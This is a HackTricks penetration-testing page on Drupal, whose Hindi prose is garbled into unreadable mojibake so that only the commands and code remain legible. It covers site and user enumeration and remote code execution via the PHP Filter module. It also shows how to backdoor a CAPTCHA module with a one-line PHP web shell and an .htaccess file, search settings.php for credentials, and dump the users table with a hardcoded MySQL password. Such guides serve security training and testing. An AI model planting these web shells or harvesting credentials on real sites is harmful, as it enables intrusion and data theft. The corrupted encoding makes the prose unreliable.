# рдбреНрд░реБрдкрд▓

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## рдЦреЛрдЬ

* **рдореЗрдЯрд╛** рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **рдиреЛрдб**: рдбреНрд░реБрдкрд▓ **рдЕрдкрдиреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдиреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреБрдХреНрд░рдорд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдПрдХ рдиреЛрдб рдореЗрдВ рдХреБрдЫ рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдПрдХ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ, рдорддрджрд╛рди, рд▓реЗрдЦ рдЖрджрд┐ред рдкреГрд╖реНрда URI рд╕рд╛рдорд╛рдиреНрдпрдд: рд░реВрдк рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ `/node/<рдиреЛрдб рдЖрдИрдбреА>`ред
```bash
curl drupal-site.com/node/1
```
## рдЬрд╛рдВрдЪ

Drupal рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рддреАрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ:

1. **`рдкреНрд░рд╢рд╛рд╕рдХ`**: рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдкреВрд░рд╛ рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрддрд╛ рд╣реИред
2. **`рдкреНрд░рдорд╛рдгреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛`**: рдпреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд▓реЗрдЦ рдЬреЛрдбрд╝рдиреЗ рдФрд░ рд╕рдВрдкрд╛рджрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
3. **`рдЕрдирд╛рдордд`**: рд╕рднреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЖрдЧрдВрддреБрдХ рдЕрдирд╛рдордд рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХреЗрд╡рд▓ рдкреЛрд╕реНрдЯ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

### рд╕рдВрд╕реНрдХрд░рдг

* `/CHANGELOG.txt` рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
рдбреНрд░реБрдкрд▓ рдХреЗ рдирдП рд╕реНрдерд╛рдкрдирд╛рдиреБрд╕рд╛рд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `CHANGELOG.txt` рдФрд░ `README.txt` рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдмреНрд▓реЙрдХ рдХреА рдЬрд╛рддреА рд╣реИред
{% endhint %}

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЧрдгрдирд╛

#### рдкрдВрдЬреАрдХрд░рдг

_/user/register_ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдФрд░ рдпрджрд┐ рдирд╛рдо рдкрд╣рд▓реЗ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рд╕реВрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

![](<../../.gitbook/assets/image (325).png>)

#### рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (900).png>)

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (304).png>)

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

_/user/\<number>_ рддрдХ рдкрд╣реБрдБрдЪрдХрд░ рдЖрдк рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ 2 рд╣реИ рдХреНрдпреЛрдВрдХрд┐ _/users/3_ рдПрдХ рдЦреЛрдЬ рддреНрд░реБрдЯрд┐ рджреЗрддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (330).png>)

![](<../../.gitbook/assets/image (227) (1) (1) (1).png>)

### рдЫрд┐рдкреА рдкреГрд╖реНрда

**`/node/$` рдЬрд╣рд╛рдБ `$` рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реИ** (1 рд╕реЗ 500 рддрдХ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП)ред\
рдЖрдк **рдЫрд┐рдкреА рдкреГрд╖реНрда** (рдкрд░реАрдХреНрд╖рдг, рдбреЗрд╡) рдЦреЛрдЬ рд╕рдВрдЪрд╛рд░ рджреНрд╡рд╛рд░рд╛ рд╕рдВрджрд░реНрднрд┐рдд рдирд╣реАрдВ рдХрд┐рдП рдЧрдП рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

#### рд╕реНрдерд╛рдкрд┐рдд рдореЙрдбреНрдпреВрд▓ рдЬрд╛рдирдХрд╛рд░реА
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕рд╛рде

{% hint style="warning" %}
рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдбреНрд░реБрдкрд▓ **(8 рд╕рдВрд╕реНрдХрд░рдг рд╕реЗ рдкрд╣рд▓реЗ)** рдореЗрдВ, рдПрдбрдорд┐рди рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдФрд░ **`PHP рдлрд╝рд┐рд▓реНрдЯрд░` рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛** рдерд╛, рдЬреЛ "рдПрдореНрдмреЗрдбреЗрдб PHP рдХреЛрдб/рд╕реНрдирд┐рдкреЗрдЯ рдХреЛ рдореВрд▓реНрдпрд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред"
{% endhint %}

рдЖрдкрдХреЛ **рдкреНрд▓рдЧрдЗрди php рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** (рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП _/modules/php_ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ рдФрд░ рдпрджрд┐ рдпрд╣ **403** рд▓реМрдЯрддрд╛ рд╣реИ рддреЛ, **рдореМрдЬреВрдж рд╣реИ**, рдЕрдЧрд░ **рдирд╣реАрдВ рдорд┐рд▓рд╛**, рддреЛ **рдкреНрд▓рдЧрдЗрди php рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИ**)

_рдореЙрдбреНрдпреВрд▓_ рдкрд░ рдЬрд╛рдПрдВ -> (**рдЬрд╛рдВрдЪреЗрдВ**) _PHP рдлрд╝рд┐рд▓реНрдЯрд░_ -> _рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рд╣реЗрдЬреЗрдВ_

![](<../../.gitbook/assets/image (247) (1).png>)

рдлрд┐рд░ _рд╡рд┐рд╖рдп рдЬреЛрдбрд╝реЗрдВ_ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ -> _рдмреЗрд╕рд┐рдХ рдкреЗрдЬ_ рдпрд╛ _рд▓реЗрдЦ рдЪреБрдиреЗрдВ_ -> _рд╢рд░реАрд░ рдкрд░ php рд╢реИрд▓рдХреЛрдб рд▓рд┐рдЦреЗрдВ_ -> _рдкреАрдПрдЪрдкреА рдХреЛрдб_ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ _рдкрд╛рда рд╕реНрд╡рд░реВрдк_ рдореЗрдВ -> _рдкреВрд░реНрд╡рд╛рд╡рд▓реЛрдХрди рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ_

![](<../../.gitbook/assets/image (335).png>)

рдЕрдВрдд рдореЗрдВ, рдмрд╕ рдирдП рдиреЛрдб рдкрд░ рдкрд╣реБрдВрдЪреЗрдВ:
```bash
curl http://drupal-site.local/node/3
```
### PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдореЙрдбреНрдпреВрд▓ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ

**8 рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рд╕реЗ**, [**PHP рдлрд╝рд┐рд▓реНрдЯрд░**](https://www.drupal.org/project/php/releases/8.x-1.1) **рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдирд╣реАрдВ рд╣реИ**ред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ **рдореЙрдбреНрдпреВрд▓ рдЦреБрдж рд╣реА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред

1. Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рд╕рдмрд╕реЗ рд╣рд╛рд▓ рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. рдбрд╛рдЙрдирд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж **`рдкреНрд░рд╢рд╛рд╕рди`** > **`рд░рд┐рдкреЛрд░реНрдЯреНрд╕`** > **`рдЙрдкрд▓рдмреНрдз рдЕрдкрдбреЗрдЯреНрд╕`** рдкрд░ рдЬрд╛рдПрдВред
4. **`рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЪреБрдиреЗрдВ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдерд╛, рдФрд░ рдлрд┐рд░ **`рдЗрдВрд╕реНрдЯреЙрд▓`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
5. рдПрдХ рдмрд╛рд░ рдЬрдм рдореЙрдбреНрдпреВрд▓ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛ рдЬрд╛рдП, рд╣рдо **`рд╕рд╛рдордЧреНрд░реА`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдирдпрд╛ рдмреЗрд╕рд┐рдХ рдкреЗрдЬ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ Drupal 7 рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдХрд┐рдпрд╛ рдерд╛ред рдлрд┐рд░ рд╕реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **`рдкрд╛рда рд╕реНрд╡рд░реВрдк` рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╕реЗ `PHP рдХреЛрдб` рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ**ред

### рдмреИрдХрдбреЛрд░реНрдб рдореЙрдбреНрдпреВрд▓

рдПрдХ рдмреИрдХрдбреЛрд░реНрдб рдореЙрдбреНрдпреВрд▓ **рдореМрдЬреВрджрд╛ рдореЙрдбреНрдпреВрд▓ рдореЗрдВ рдПрдХ рд╢реИрд▓ рдЬреЛрдбрд╝рдХрд░ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдореЙрдбреНрдпреВрд▓ drupal.org рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЪрд▓рд┐рдП рдПрдХ рдореЙрдбреНрдпреВрд▓ рдЪреБрдирддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ [CAPTCHA](https://www.drupal.org/project/captcha)ред рдиреАрдЪреЗ рд╕реНрдХреНрд░реЙрд▓ рдХрд░реЗрдВ рдФрд░ tar.gz [рдЖрд░реНрдХрд╛рдЗрд╡](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХреЙрдкреА рдХрд░реЗрдВред

* рдЖрд░реНрдХрд╛рдЗрд╡ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЙрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓реЗрдВред
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдПрдХ **PHP рд╡реЗрдм рд╢реИрд▓** рдмрдирд╛рдПрдВ:
```php
<?php
system($_GET["cmd"]);
?>
```
* рдЕрдЧрд▓реЗ, рд╣рдореЗрдВ рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП **`.htaccess`** рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреА рд╣реЛрдЧреАред рдпрд╣ рдЬрд░реБрд░реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Drupal **`/modules`** рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рд╕реАрдзрд╛ рдкрд╣реБрдБрдЪ рдирд╣реАрдВ рджреЗрддрд╛ред
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* рдКрдкрд░ рдХрд╛ рд╡рд┐рдиреНрдпрд╛рд╕ рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдирд┐рдпрдореЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░реЗрдЧрд╛ рдЬрдм рд╣рдо /modules рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВред рдЗрди рджреЛрдиреЛрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ captcha рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ рдФрд░ рдПрдХ рдЖрд░реНрдХрд╛рдЗрд╡ рдмрдирд╛рдПрдВред
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* рдпрд╣ рдорд╛рдирддреЗ рд╣реБрдП рдХрд┐ рд╣рдореЗрдВ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ **рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдВрдЪ** рд╣реИ, **`Manage`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдЗрдбрдмрд╛рд░ рдкрд░ **`Extend`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЕрдЧрд▓реЗ, **`+ Install new module`** рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рд╣рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдкреГрд╖реНрда рдкрд░ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреИрд╕реЗ `http://drupal-site.local/admin/modules/install`ред рдмреИрдХрдбреЛрд░ рдХреИрдкреНрдЪрд╛ рд╕рдВрдЧреНрд░рд╣ рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ рдФрд░ **`Install`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* рд╕реНрдерд╛рдкрдирд╛ рд╕рдлрд▓ рд╣реЛрдиреЗ рдкрд░, **`/modules/captcha/shell.php`** рдкрд░ рдЬрд╛рдХрд░ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВред

## рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

### settings.php рдкрдврд╝реЗрдВ
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбрдВрдк
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## рд╕рдВрджрд░реНрдн

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **PDF рдореЗрдВ HackTricks рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
